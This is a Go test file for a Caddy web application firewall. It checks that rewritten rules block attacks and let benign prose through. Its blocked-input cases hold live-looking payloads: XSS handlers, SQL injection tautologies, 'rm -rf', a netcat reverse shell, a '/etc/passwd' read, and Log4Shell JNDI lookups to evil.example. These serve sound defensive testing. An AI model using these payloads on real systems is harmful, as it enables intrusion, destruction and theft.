package caddywaf

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// Pins for the rules-audit part 2 rewrite of the surviving rules.json rules:
// the false negatives the old patterns missed must now block, and the prose /
// benign shapes the old patterns matched must now pass.

func rewriteQuery(t *testing.T, m *Middleware, onWire string) int {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, "/r", nil)
	req.URL.RawQuery = onWire
	req.RequestURI = "/r?" + onWire
	return fpServe(t, m, req)
}

func TestRewriteClosesFalseNegatives(t *testing.T) {
	m := fpMiddleware(t)

	blockedQueries := []struct{ name, onWire string }{
		{"uncommon event handler", "q=<details open ontoggle=confirm(1)>"},
		{"svg slash separator", "q=<svg/onload=alert(1)>"},
		{"body tag pointer handler", "q=<body onpointerdown=confirm(document.domain)>"},
		{"string tautology", "id=1' OR 'a'='b"},
		{"OR true tautology", "id=1' or true--"},
		{"rm command injection", "q=;rm -rf /var/www"},
		{"nc reverse shell", "q=|nc -e /bin/sh 10.0.0.1 4444"},
		{"encoded-newline command injection", "q=%0acat%20/etc/passwd"},
		{"T-SQL waitfor delay", "q=1'; waitfor delay '0:0:5'--"},
	}
	for _, c := range blockedQueries {
		t.Run("query "+c.name, func(t *testing.T) {
			code := rewriteQuery(t, m, c.onWire)
			assert.Equalf(t, http.StatusForbidden, code, "attack %q must be blocked", c.onWire)
		})
	}

	t.Run("log4shell in header", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/", nil)
		req.Header.Set("X-Api-Version", "${jndi:ldap://evil.example/a}")
		assert.Equal(t, http.StatusForbidden, fpServe(t, m, req))
	})
	t.Run("log4shell obfuscated nested lookup", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/", nil)
		req.Header.Set("User-Agent", "${${lower:j}ndi:ldap://evil.example/a}")
		assert.Equal(t, http.StatusForbidden, fpServe(t, m, req))
	})
	t.Run("body string tautology", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/f", strings.NewReader("name=x' OR 'a'='a"))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		assert.Equal(t, http.StatusForbidden, fpServe(t, m, req))
	})
}

func TestRewriteRemovesProseFalsePositives(t *testing.T) {
	m := fpMiddleware(t)

	t.Run("SQL keywords in body prose", func(t *testing.T) {
		body := "comment=please select an item from the list and update where needed, then delete from your cart"
		req := httptest.NewRequest(http.MethodPost, "/comment", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		assert.NotEqual(t, http.StatusForbidden, fpServe(t, m, req))
	})
	t.Run("JS-ish words in body prose", func(t *testing.T) {
		body := "note=please confirm (by clicking) and check the retrieval(cached) result"
		req := httptest.NewRequest(http.MethodPost, "/note", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		assert.NotEqual(t, http.StatusForbidden, fpServe(t, m, req))
	})
	t.Run("select and from as unrelated params", func(t *testing.T) {
		code := rewriteQuery(t, m, "select=name&from=2024&where=home")
		assert.NotEqual(t, http.StatusForbidden, code)
	})
	t.Run("netmask parameter", func(t *testing.T) {
		code := rewriteQuery(t, m, "mask=255.255.255.0")
		assert.NotEqual(t, http.StatusForbidden, code)
	})
	t.Run("Zapier webhook UA", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/hook", nil)
		req.Header.Set("User-Agent", "Zapier/1.0 (+https://zapier.com)")
		assert.NotEqual(t, http.StatusForbidden, fpServe(t, m, req))
	})
	t.Run("single encoded newline in Referer", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/page", nil)
		req.Header.Set("Referer", "https://example.com/?text=line1%0aline2")
		assert.NotEqual(t, http.StatusForbidden, fpServe(t, m, req))
	})
}
